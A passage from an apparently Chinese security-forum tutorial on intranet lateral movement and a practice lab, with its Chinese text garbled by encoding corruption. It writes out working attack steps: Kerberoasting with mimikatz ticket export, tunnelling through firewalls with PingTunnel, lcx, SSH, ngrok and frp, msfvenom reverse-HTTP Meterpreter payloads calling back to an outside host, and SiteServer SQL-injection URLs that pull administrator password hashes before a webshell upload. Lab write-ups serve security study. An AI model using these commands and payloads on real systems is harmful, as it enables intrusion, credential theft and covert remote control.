![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_TTYEMJQTVJDW78E.png)  
éæ°è®¿é®åæ§çå ±äº«ç®å½ï¼  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_6XEBB4ASEY47CCN.png)

#
[](https://bbs.pediy.com/thread-268289.htm#%E4%BA%94%E3%80%81%E5%88%A9%E7%94%A8spn%E6%9C%8D%E5%8A%A1%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8)äºãå©ç¨SPNæå¡è¿è¡æ¨ªåç§»å¨

å¨åç¯å¢ä¸­ï¼SPNæ«ææ¯æ¥æ¾ç¸å
³æå¡è¾å¥½çæ¹æ³ï¼å¯ä»¥ä»ç¸å
³æå¡çæï¼å¦MSSQLãWSMANãExchangeãTERMSERVãHyper-Vãå
¶æ«ææ¯éè¿è¯·æ±ç¹å®SPNç±»åçæå¡ä¸»é¢åç§°è¿è¡çãä¸æ®éç½ç»ç«¯å£ç¸æ¯ï¼SPNæ«æä¸éè¦è¿æ¥IPæ¥æ£æµæå¡ç«¯å£ï¼æä»¥è½è§é¿ä¸äºIPSçè§åï¼ä¸è¿è¡æ«æåªéæ®éåç¨æ·æéã  
æ³¨åSPN  
Setspn -A c3/test MSSQL  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_JFE2FPPJ7PNSFBZ.png)  
æ¥çæ³¨åçSPN  
Setspn -q _/_  
Setspn -q _/_ | findstr âMYSQLâ  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_Z7ZRGCTCK2TAEGE.png)  
è¯·æ±æå¡ç¥¨æ®  
Add-Type -AssemblyName System.IdentityModel  
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken
-ArgumentList "MySQL/win7.xie.com:3306/MySQL"  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_R8979DQSWYDTG6M.png)  
ååºæå¡ç¥¨æ®  
Klist  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_JXQTKKT3SHYT8SF.png)  
å¹¶ç¨mimikatzå°ç¥¨æ®å¯¼åº  
Kerberos::list /export  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_9GJ9D6KCKVBW7MW.png)  
æåä½¿ç¨tgsrepcrack.pyçç ´å¾å°ç¸åºå¯ç ã

#
[](https://bbs.pediy.com/thread-268289.htm#%E5%85%AD%E3%80%81%E9%9A%A7%E9%81%93%E9%80%9A%E4%BF%A1)å
­ãé§ééä¿¡

## [](https://bbs.pediy.com/thread-268289.htm)6.1 ç½ç»å±é§é

1

2

|

`ICMPé§éæ¯ç½ç»å±å¸¸ç¨çé§éä¹ä¸ãå¨ICMPåè®®ä¸­ï¼è®¾å¤é´çéä¿¡æ¯ä¸éè¦å¼æ¾ç¸åºçç«¯å£ãå½æ»å»è
ä½¿ç¨åç±»ä¸å±é§éè¿è¡éä¿¡åå¤±è´¥æ¶ï¼åå¯éè¿pingå½ä»¤è®¿é®ç®æ
è®¡ç®æºï¼å¹¶å°è¯å»ºç«ICMPé§éï¼å°TCP``/``UDPç­ç¸åºéè¦ä¼
è¾çæ°æ®å°è£ å°pingæ°æ®å ä¸­ï¼ä»èç©¿è¿é²ç«å¢å®ç°éè®¯ã`

`å ¶ä¸­PingTunnelæ¯ICMPé§éçå¸¸ç¨å·¥å
·ï¼å¯è·¨å¹³å°ä½¿ç¨ãä¸é¢ä½¿ç¨è¯¥å·¥å ·è¿è¡ç¸åºçæä½ï¼`  
  
---|---  
  
å å¨åæ§ç«¯ï¼webæå¡å¨ï¼è¿è¡PingTunnelå·¥å
·ï¼æ§è¡å¼å¯é§éå½ä»¤  
sudo ./pingtunnel -type server  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_AB5W5S5BHVS4WUJ.png)  
å¨æ§å¶ç«¯ï¼å
¬ç½vpsï¼æ§è¡ä¸é¢å½ä»¤ï¼æå¼éè¦çå¬çæ¬å°ç«¯å£ï¼ä¼ææå®çæå¡å¨ç¸åºç«¯å£çæ°æ®å°è£
å¨ICMPé§éä¸­ï¼ä»¥åæ§ç«¯ï¼webæå¡å¨ï¼ä¸ºIMCPé§éè·³æ¿è¿è¡ä¼
è¾ã  
pingtunnel -type client -l :æ¬å°æçå¬çç«¯å£ -s åæ§ç«¯IP -t
æå®è¦è½¬åçç®æ IP:æå®è¦è½¬åçç®æ ç«¯å£ -tcp 1  
pingtunnel -type client -l :33444 -s 192.168.74.132 -t 192.168.96.145:80 -tcp
1  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_QK2JRKQ45MF9NWQ.png)  
è®¿é®æ¬å°çå¬ç«¯å£ï¼  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_C8ZWJ3GX3BUZKPD.png)

## [](https://bbs.pediy.com/thread-268289.htm)6.2 ä¼ è¾å±é§é

Lcxæ¯ä¼ è¾å±ç»å ¸çè½¬åå·¥å
·ãLcxæ¯ä¸ä¸ªåºäºSocketå¥æ¥å­å®ç°çè½¬åå·¥å ·ï¼å
¶linuxçæ¬ä¸ºportmapãä¸ä¸ªæ­£å¸¸çSocketé§éå¿ é¡»å
·å¤ä¸¤ç«¯ï¼ä¸ç«¯ä¸ºæå¡ç«¯ï¼è´è´£çå¬ä¸ä¸ªç«¯å£å¹¶ç­å¾
å®¢æ·ç«¯è¿æ¥ï¼å¦ä¸ç«¯ä¸ºå®¢æ·ç«¯ï¼éè¿æå¡ç«¯çå°ååç«¯å£ä¸å
¶è¿æ¥ï¼å¹¶è½¬åç¸åºçæ°æ®ç»æå¡ç«¯ã  
å¨èªå·±çå
¬ç½vpsï¼å³æå¡ç«¯ï¼æ§è¡çå¬å½ä»¤ï¼å°æ¬æº4444ç«¯å£ä¸çå¬çæææ°æ®è½¬åç»æ¬æºç5555ç«¯å£ï¼ä»¥ä¾¿å
¶å®æºå¨è®¿é®ã  
Lcx.exe -listen 4444 5555  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_2Y4S34KV657RGWU.png)  
å¨åæ§ç«¯ï¼å³å®¢æ·ç«¯ï¼æ§è¡æ°æ®è½¬åå½ä»¤ï¼å°ç®æ
æºå¨ç80ç«¯å£è½¬åå°å ¬ç½vpsç4444ç«¯å£ã  
Lcx.exe -slave å ¬ç½ip 4444 ç®æ æºå¨IP 80  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_FES9GHVB9CEN4KJ.png)  
æä»¬éè¿vpsçipå5555è®¿é®å°ç®æ æºå¨ç80ç«¯å£ï¼  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_YA4Z42HDVAZX2PU.png)



åæ ·å°lcxä¹å¸¸ç¨äºæ¬å°ç«¯å£æ å°ï¼å½ç®æ
æå¡å¨ç±äºé²ç«å¢éå¶ï¼é¨åç«¯å£æ²¡è½éè¿é²ç«å¢æ¶ï¼å¯ä»¥å°ç®æ
æå¡å¨ååºç«¯å£æ°æ®è½¬åå°é²ç«å¢å è®¸çç«¯å£ãå¨ç®æ
æå¡å¨æ§è¡ä¸é¢å½ä»¤ï¼å³å¯æè¿ç¨æ¡é¢è½¬å°53ç«¯å£ï¼  
Lcx -tran 53 ç®æ æå¡å¨IP 3389

## [](https://bbs.pediy.com/thread-268289.htm)6.3 åºç¨å±é§é

1

2

|

`åºç¨å±çé§ééä¿¡ä¸»è¦å©ç¨åºç¨è½¯ä»¶æä¾çç«¯å£è½¬åæ°æ®ãå¸¸è§çåºç¨å±é§éåè®®æSSHãHTTPãDNSç­ãå
¶ä¸­SSHåè®®éå¸¸æ¯è¢«å è®¸éè¿é²ç«å¢åè¾¹çè®¾å¤çï¼ä¸å
ç½ä¸­Linuxè®¾å¤é½æ¯æSSHåè®®ï¼åæ¶SSHçä¼ è¾è¿ç¨æ¯å
å¯çï¼ä½¿å¾é¾ä»¥åºååæ³çSSHåæ»å»è å»ºç«çé§éã`

`å¸¸ç¨çSSHé§éæä»¥ä¸å
ç§ç±»åï¼æ¬å°è½¬åãè¿ç¨è½¬åãå¨æè½¬åãSSHå½ä»¤å¸¸ç¨åæ°æ:`  
  
---|---  
  
-Cï¼åç¼©ä¼ è¾ï¼æé«éåº¦ã  
-f: åå°æ§è¡  
-N:å»ºç«éé»è¿æ¥  
-g:å è®¸è¿ç¨ä¸»æºè¿æ¥æ¬å°ç¨äºè½¬åçç«¯å£  
-L:æ¬å°ç«¯å£è½¬å  
-R:è¿ç¨ç«¯å£è½¬å  
-D:å¨æç«¯å£è½¬å  
-P:æå®SSHç«¯å£



æ¬å°è½¬åï¼  
å¨VPSæ§è¡å¦ä¸ç¸åºå½ä»¤ï¼è¯¥å½ä»¤ä»¥webæå¡å¨ä¸ºè·³æ¿ï¼å°å
ç½æå¡å¨çç«¯å£æ å°å°å ¬ç½çvpsä¸ï¼æä»¬è®¿é®å¯¹åºå
¬ç½vpsçç«¯å£å³å¯ã  
Ssh -CfNg -L å ¬ç½VPSç«¯å£:ç®æ ä¸»æºIP:ç®æ ç«¯å£å· root@è·³æ¿æºIP



è¿ç¨è½¬åï¼  
å½å ¬ç½çvpsä¸è½è®¿é®è®¿é®å°å ç½çæå¡å¨ï¼å
æ¬webæå¡å¨ï¼ï¼ä½webæå¡å¨è½è®¿é®å°å
¬ç½çvpsæ¶ï¼æä»¬å¨webæå¡å¨æ§è¡å¦ä¸ç¸åºå½ä»¤ï¼è¯¥å½ä»¤ä»¥webæå¡å¨ä¸ºè·³æ¿ï¼å°vpsç«¯å£çæµéè½¬åå°å
ç½æå¡å¨ç¸åºç«¯å£ä¸ï¼æä»¬è®¿é®å¯¹åºå ¬ç½vpsçç«¯å£å³å¯ã  
Ssh -CfNg -R vpsç«¯å£:ç®æ ä¸»æºIP:ç®æ ç«¯å£å· root@è·³æ¿æºIP



å¨æè½¬åï¼  
å¨æç«¯å£æ å°æ¶å»ºç«ä¸ä¸ªsshå
å¯çsocks4/5ä»£çééï¼ä»»ä½æ¯æsocks4/5åè®®çç¨åºé½å¯ä»¥éè¿æ­¤ééè¿è¡ä»£çè®¿é®ãæä»¬å¨vpsä¸æ§è¡å¦ä¸å½ä»¤ï¼  
ssh -CfNg -D 7000 root@ä»£çä¸»æºIP

## [](https://bbs.pediy.com/thread-268289.htm)6.4 Ngrokå®ç°å ç½ç©¿é

æ§è¡å½ä»¤./sunny clientid d8d99b5ff5d4996  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_C8KXY3PHT6RT74T.png)  
è®¿é®å¯¹åºçååï¼ç¡®è®¤è½è¿æ¥æåï¼  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_DNUQHQK45N68J4S.png)  
æ§è¡å½ä»¤çæç¸åºçexeï¼  
msfvenom -p windows/meterpreter/reverse_http lhost=mai1zhi2.free.idcfengye.com
lport=80 -f exe -o h7.exe  
è®¾ç½®å¥½ç¸åºçpayloadåï¼æå¼çå¬ï¼è¿è¡exeï¼  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_FADX3B7NE9YCSSV.png)

## [](https://bbs.pediy.com/thread-268289.htm)6.5 frpå®ç°å ç½ç©¿é

æå¡ç«¯é»è®¤çå¬ç«¯å£æ¯7000ï¼æ§è¡å½ä»¤ï¼å¯å¨æå¡ç«¯ ./frps -c
./frps.ini  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_SYZ7DKFHGMAZBGS.png)  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_ADBHQ5B6V5RXNDF.png)  
å¯å¨å®¢æ·ç«¯frpcé ç½®æä»¶:  
[msf]  
type = tcp  
local_ip = æ¬å°ipå°å  
local_port = 22222 è½¬åç»æ¬æºç22222ç«¯å£ï¼ä¹å°±æ¯msfççå¬ç«¯å£  
remote_port = 6000 æå¡ç«¯æå¼6000ç«¯å£è¿è¡çå¬  
æ§è¡å½ä»¤è¿æ¥æå¡ç«¯ï¼./frpc -c ./frpc.ini  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_XEPPT8DSRAPMJ5C.png)  
æå¡ç«¯æ¾ç¤ºæå®¢æ·ç«¯è¿æ¥ï¼  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_DREBEB9WEBZSMUR.png)  
æå¡ç«¯å¼å¯6000ç«¯å£è¿è¡çå¬  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_JV8NVHRRYDKN8JM.png)  
Msfçæexeæä»¶ï¼  
msfvenom -p windows/meterpreter/reverse_http lhost=å ¬ç½ip lport=å
¬ç½ipçå¬çç«¯å£ -f exe -o h4.exe  
æ§è¡exeä¸çº¿ï¼  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_2TFZJ6EX3UM3HVF.png)

#
[](https://bbs.pediy.com/thread-268289.htm#%E4%B8%83%E3%80%81%E9%9D%B6%E5%9C%BA%E5%AE%9E%E8%B7%B5)ä¸ãé¶åºå®è·µ

## [](https://bbs.pediy.com/thread-268289.htm)7.1 ä¿¡æ¯æ¶é

è¿ä¸ªé¶åºæ¯æå¸å
ææ­ï¼æä»¬ç¨è¿ä¸ªé¶åºä½ä¸ºå®è·µï¼é¶åºææå¾ï¼  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_3XX42FRFCWAD877.png)  
å è¿è¡ä¸»æºåç°ï¼æ¹æ³æè®¸å¤ï¼åå«æ¯åºäºå±é¢åå·¥å
·ä¸çä¸åï¼  
1ãä½¿ç¨netdiscover  
sudo netdiscover -i eth0 -r 192.168.202.0/24  
ä¸ç¨çäºå±åç°å·¥å ·ãæ¥æä¸»å¨åè¢«å¨åç°ä¸¤ç§æ¹å¼ã  
å¸¸ç¨åæ°:  
-iï¼ç½å¡ éæ©ä½ çæ§çç½å¡ãæ¯å¦eth0  
-rï¼range æå®IPæ®µãæ¯å¦192.168.0.0/24  
-lï¼filename ä»æä»¶è¯»årangeåè¡¨  
-p è¢«å¨æ¨¡å¼ãé»é»çä¾¦å¬æå®çç½å¡ä»¥åç°å«çäºå±ä¸»æº  
-t ARPå åéé´éãåä½æ¯«ç§ãè¿ä¸ªå¯ä»¥ç¨æ¥è§é¿æ£æµç³»ç»çåè­¦ã  
-c åå æ°é  
2ãä½¿ç¨nmap  
nmap -v -sP 192.168.202.0/24  
ä»¥ä¸åæ°ï¼  
-sPãICMPæ«æï¼ ç±»ä¼¼äºpingæ£æµï¼å¿«éå¤æ­ç®æ ä¸»æºæ¯å¦å­æ´»ï¼ä¸åå ¶ä»æ«æ  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_S7VQR4YCFHUZVR6.png)  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_9YQK4ST92HFNV56.png)  
3ãä½¿ç¨ç³»ç»èªå¸¦ping(éåº¦ç¨æ ¢)  
for /L %I in (1,1,256) DO @ping -w 1 -l 1 192.168.202.%I | findstr âTTL=â  
fping -g 10.10.10.0/24



ç¶åå¯¹æåç°çä¸»æºè¿è¡ç«¯å£æ«æï¼åæ ·ä¹æä¸åå·¥å
·æ¥è¿è¡ç«¯å£æ«æï¼  
1ãnmap  
nmap -sS -p 1-65535 -v 192.168.202.183  
ä»¥ä¸åæ°ï¼  
-P æå®ç«¯å£æ«æ  
-V è¯¦ç»ä¿¡æ¯  
-sSãTCP SYNæ«æï¼åå¼æ«æï¼ï¼ åªåç®æ ååºSYNæ°æ®å ï¼å¦ææ¶å°SYN/ACKååºå å°±è®¤ä¸ºç®æ ç«¯å£æ­£å¨çå¬ï¼å¹¶ç«å³æ­å¼è¿æ¥ï¼å¦åè®¤ä¸ºç®æ ç«¯å£å¹¶æªå¼æ¾ã  
-sTãTCP è¿æ¥æ«æï¼ è¿æ¯å®æ´çTCPæ«ææ¹å¼ï¼ç¨æ¥å»ºç«ä¸ä¸ªTCPè¿æ¥ï¼å¦ææååè®¤ä¸ºç®æ ç«¯å£æ­£å¨çå¬æå¡ï¼å¦åè®¤ä¸ºç®æ ç«¯å£å¹¶æªå¼æ¾ã  
-sFãTCP FINæ«æï¼ å¼æ¾çç«¯å£ä¼å¿½ç¥è¿ç§æ°æ®å ï¼å ³é­çç«¯å£ä¼ååºRSTæ°æ®å ãè®¸å¤é²ç«å¢åªå¯¹SYNæ°æ®å è¿è¡ç®åè¿æ»¤ï¼èå¿½ç¥äºå ¶ä»å½¢å¼çTCPæ»å»å ãè¿ç§ç±»åçæ«æå¯é´æ¥æ£æµé²ç«å¢çå¥å£®æ§ã  
-sUãUDPæ«æï¼ æ¢æµç®æ ä¸»æºæä¾åªäºUDPæå¡ï¼UDPæ«æçéåº¦ä¼æ¯è¾æ ¢ã  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_9AUXVW657UDYFY4.png)  
è¯å«å¯¹åºçç«¯å£  
nmap -sV -A 192.168.202.183 -p 80,53,6588,5985,3389,135,21,999 -oA
myAttackPorts  
-sV: æ¢æµç¸åºæå¡çæ¬å·  
-A: ç»¼åæ«æï¼å å«1-10000çç«¯å£pingæ«æï¼æä½ç³»ç»æ«æï¼èæ¬æ«æï¼è·¯ç±è·è¸ªï¼æå¡æ¢æµ  
-oAï¼åæ¶å¨ä¸ä¸ªä¸»è¦çæ ¼å¼ææ¡£è¾åºæ«æç»æ  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_TBRDDWP33AE9HTG.png)  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_TWJEJKGZR3DGEWT.png)  
ä½¿ç¨xsltprocç¾åç»æè¾åºææ¡£ï¼  
xsltproc -o attck.html mode.xsl myAttackPorts.xml  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_EVY2JF5EYFHCDCH.png)



2ãmasscan  
sudo masscan -p 1-65535 192.168.202.183 --rate=1000  
å¸¸ç¨åæ°ï¼  
-p <ports,--ports <ports>> æå®ç«¯å£è¿è¡æ«æ  
\--banners è·åbannerä¿¡æ¯ï¼æ¯æå°éçåè®®  
\--rate <packets-per-second> æå®åå çéçï¼é»è®¤çéçæ¯100å
/ç§  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_J7N44XAK423U7XZ.png)



ç»å®ååï¼åå¯¹å ¶www.moonlab.comè¿è¡ç®å½çç ´ï¼  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_GSX7X5T5Y7TN5KT.png)  
å¦æç¨kalièªå¸¦çdirbusterå·¥å ·ä¼å ä¸ºUAåéåº¦ç­é®é¢è¢«æ¦æªï¼  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_4V9EFGY9HNGHPVW.png)  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_DRDANTVV9HH26AT.png)  
æä»¥æä»¬å¯ä»¥èªå·±ç¼åèæ¬è¿è¡ç®å½ççç
´ï¼æ¯é´é0.5ç§è¿è¡è¯·æ±æä½ï¼  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_Q3XK7E8Q3N3BPBB.png)  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_U2P2S62W76GU3WV.png)

## [](https://bbs.pediy.com/thread-268289.htm)7.2 webæ¼æ´

è®¿é®ç½åå¯ç¥ï¼è¿æ¯siteserver3.6.1ï¼ä»ç½ä¸æ¾å°è¯¥çæ¬æ¥éæ³¨å
¥çç¸å ³pocï¼è·å¾æ°æ®åºçæ¬ä¿¡æ¯ï¼  
http://www.moonlab.com/usercenter/platform/user.aspx?UnLock=sdfe%27&UserNameCollection=test%27)%20and%20char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version=2;%20--  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_J8X63NY89QUWHT3.png)  
è·å¾æ°æ®åºåï¼  
http://www.moonlab.com/usercenter/platform/user.aspx?UnLock=sdfe%27&UserNameCollection=test%27)%20and%20db_name()=~2;%20--  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_QQKFE4WA9T532DC.png)  
æ ¹æ®æ¥è¯¢æ°æ®åºè¯­å¥ç¸ç»§è·åå°åå°çç¨æ·åãå¯ç
åsaltå¼ï¼  
http://www.moonlab.com/usercenter/platform/user.aspx?UnLock=sdfe%27&UserNameCollection=test%27)%20and%20~1=(SELECT%20TOP%201%20[Password]%20FROM%20[bairong_Administrator]);%20--  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_EE9SMBR8FHGK85V.png)  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_BMSANUAUQGEGMPP.png)  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_TRZ3N6V227PGMR8.png)



ç¶åæä»¬æ ¹æ®ç½ä¸æä¸è½½çåçåæåºå ¶ç»å½æ¶çå¯ç å
å¯æµç¨ï¼  
å çFrameworkLoginç±»çSubmit_Onclick()æ¹æ³ï¼æµç¨å¾ç®åå
å¤æ­éªè¯ç ï¼ç¶åæç¨æ·ååå¯ç ä¼ å ¥AdminManager.Authticateï¼  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_ES9S4JTAVG687Q5.png)  
ç»§ç»­è·å
¥AdminManager.Authticateï¼è°ç¨äºAdministratorDAO.ValidateUser()éªè¯ï¼  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_X3Z3CHQHXZKGGGG.png)  
ç»§ç»­è·å ¥AdministratorDAO.ValidateUser()çå®ç°ï¼å½æ°å æ
¹æ®ç¨æ·åæ¾å°ç¨æ·çä¿¡æ¯ï¼æ ¹æ®æ°æ®åºä¸­ç¨æ·çå¯ç ä¸è¾å
¥çå¯ç è°ç¨checkpassword()å½æ°è¿è¡æ¯å¯¹ï¼  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_EW6JKUN8JFDZDH8.png)  
ææ°æ®åºä¸­çå¯ç åsaltä¼ å ¥DecodePassword()è¿è¡ç¸åºçè§£å¯ï¼  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_6FV53TPPVM5C2BW.png)  
DecodePassword()å½æ°ä¸­è°ç¨çæ¯ç³»ç»åºçdesè§£å¯ï¼  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_3WVQXG8QY8QUD5H.png)  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_NFFSDED2SNEJ9XQ.png)  
æä»¬äºè§£äºç¸å ³çè§£å¯æµç¨ï¼å°±å¯ä»¥èªå·±ç¼åç¸å
³çè§£å¯å·¥å ·å»è§£å¯åé¢æ³¨å ¥å¾å°çå¯ç ä¸ºadmin5566ã



æä»¬ä½¿ç¨å¯ç ç»å ¥åå°ï¼å°ä¸å¥è¯æå
ä¸ºzipå¹¶å¨ç«ç¹æ¨¡æ¿éè¿è¡ä¸ä¼ ï¼å¹¶ä½¿ç¨èåè¿æ¥ï¼  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_ZZE72KMG6W7R4TW.png)  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_G4J7EAYSHQF7MSH.png)  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_AQX5NT4ZQT3JQG9.png)



å¯è§SeImpersonatePrivilegeæ¯å·²å¯ç¨çï¼å½æä»¬å
·æäºSeAssignPrimaryTokenæSeImpersonateç¹æï¼é£ä¹å°±æå³çå
·æäºSYSTEMçæéãæä»¬å¯ä»¥éè¿ä¸è¿°è¿ä¸¤ä¸ªç¹æï¼å¨å
¶ä»ç¨æ·çä¸ä¸æä¸­è¿è¡ä»£ç
